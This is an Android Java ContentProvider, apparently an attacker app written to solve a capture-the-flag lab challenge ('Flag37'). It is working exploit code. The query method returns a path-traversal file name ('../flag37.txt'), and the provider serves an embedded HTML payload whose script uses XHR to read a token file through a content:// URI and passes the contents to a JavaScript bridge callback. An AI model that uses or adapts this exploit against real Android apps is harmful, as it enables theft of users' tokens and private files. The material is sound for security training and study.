package com.appdev.intentattacks;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.ParcelFileDescriptor;
import android.provider.OpenableColumns;
import android.util.Log;

import java.io.FileNotFoundException;
import java.io.IOException;

public class Flag37Provider extends ContentProvider {
    private static final String TAG = "Flag37Provider";
    private static final String MIME_TYPE = "text/html";
    private static final String EXPLOIT_HTML = "<!DOCTYPE html>\n" +
        "<html>\n" +
        "<head>\n" +
        "  <title>Exploit</title>\n" +
        "</head>\n" +
        "<body>\n" +
        "  <h2>Reading File with XHR...</h2>\n" +
        "\n" +
        "  <script>\n" +
        "    function leakFileXHR(url) {\n" +
        "      const xhr = new XMLHttpRequest();\n" +
        "      xhr.open('GET', url, true);\n" +
        "      xhr.onreadystatechange = function() {\n" +
        "        if (xhr.readyState === 4 && xhr.responseText) {\n" +
        "          console.log(xhr.responseText);\n" +
        "          if (window.hextree && window.hextree.authCallback) {\n" +
        "            window.hextree.authCallback(xhr.responseText);\n" +
        "          }\n" +
        "        }\n" +
        "      };\n" +
        "      xhr.onerror = function(error) {\n" +
        "        // console.log(error);\n" +
        "      };\n" +
        "      xhr.send();\n" +
        "    }\n" +
        "\n" +
        "    setTimeout(function() {\n" +
        "      leakFileXHR(\"content://io.hextree.files/other_files/token.txt\");\n" +
        "    }, 1000);\n" +
        "  </script>\n" +
        "</body>\n" +
        "</html>";



    @Override
    public boolean onCreate() {
        Log.i(TAG, "onCreate()");
        return true;
    }

    @Override
    public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        Log.i(TAG, "query(" + uri.toString() + ")");
        
        MatrixCursor cursor = new MatrixCursor(new String[]{
                OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE
        });
        
        // Keep the original flag37.txt entry
        cursor.addRow(new Object[]{
                "../flag37.txt", 1337L
        });
        
        // Add our exploit.html entry
        cursor.addRow(new Object[]{
                "exploit.html", EXPLOIT_HTML.getBytes().length
        });
        
        return cursor;
    }

    @Override
    public String getType(Uri uri) {
        Log.i(TAG, "getType(" + uri.toString() + ")");
        if (uri.getLastPathSegment().equals("exploit.html")) {
            return MIME_TYPE;
        }
        return "text/plain";
    }

    @Override
    public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
        Log.i(TAG, "openFile(" + uri.toString() + ")");
        
        try {
            ParcelFileDescriptor[] pipe = ParcelFileDescriptor.createPipe();
            ParcelFileDescriptor.AutoCloseOutputStream outputStream = 
                new ParcelFileDescriptor.AutoCloseOutputStream(pipe[1]);

            new Thread(() -> {
                try {
                    if (uri.getLastPathSegment().equals("exploit.html")) {
                        outputStream.write(EXPLOIT_HTML.getBytes());
                        Log.d(TAG, "[+] Exploit written as\n"+EXPLOIT_HTML);
                    } else {
                        outputStream.write("give flag".getBytes());
                    }
                    outputStream.close();
                } catch (IOException e) {
                    Log.e(TAG, "Error writing to pipe", e);
                }
            }).start();

            return pipe[0];
        } catch (IOException e) {
            throw new FileNotFoundException("Could not open pipe for: " + uri.toString());
        }
    }

    @Override
    public Uri insert(Uri uri, ContentValues values) {
        Log.i(TAG, "insert(" + uri.toString() + ")");
        return null;
    }

    @Override
    public int delete(Uri uri, String selection, String[] selectionArgs) {
        Log.i(TAG, "delete(" + uri.toString() + ")");
        return 0;
    }

    @Override
    public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) {
        Log.i(TAG, "update(" + uri.toString() + ")");
        return 0;
    }
} 